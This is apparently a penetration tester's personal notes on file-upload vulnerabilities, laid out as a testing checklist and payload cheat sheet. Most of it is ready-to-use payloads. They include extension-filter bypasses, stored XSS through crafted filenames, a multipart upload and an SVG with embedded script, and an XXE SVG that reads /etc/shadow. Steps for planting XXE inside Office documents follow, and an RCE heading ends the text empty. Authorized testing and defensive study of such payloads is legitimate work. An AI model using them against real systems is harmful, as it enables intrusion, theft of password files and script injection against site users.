1. try to upload is a .`txt`, `.svg` and `.xml`
2. test file extension
3. test content type
4. test file content
5. test file size => [[DoS]]

#### Bypass extension filters
- `zseano.php/.jpg`
- `zseano.html%0d%0a.jpg`
- 
||apache|IIS|
|---|---|---|
|extension|PHP, pHp, pht|.asp, .aspx , .asa, .cer|
||||

#### vulns from file upload

##### stored [[XSS]]
- `filename="58832_300x300.jpg<svg onload=confirm()>"`
```upload
------WebKitFormBoundaryoMZOWnpiPkiDc0yV 
Content-Disposition: form-data; name="oauth_application[logo_image_file]"; filename="testing1.html" 
Content-Type: text/html 

‰PNG 
<script>alert(0)</script>
```

```svg
<?xml version="1.0" standalone="no"?>  
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">  
  
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">  
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>  
<script type="text/javascript">  
alert("XSS by BHARAT");  
</script>  
</svg>
```
##### [[XXE]]
1. SVG payload: save the following into file as an `.svg` file and upload it to the server
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE example [ <!ENTITY test SYSTEM "file:///etc/shadow"> ]> 
<svg width="500" height="500"> 
	<circle cx="50" cy="50" r="40" fill="blue" /> 
	<text font-size="16" x="0" y="16">&test;</text> 
</svg>
```
2. `.docx` , `.xlxs`, `.pptx` files
	1. unzip the document file![[Pasted image 20240129184215.png]]
	1. insert your payload into a `.xml` file 
	2. `cd example;zip -r new_example.docx *` 
##### [[RCE]]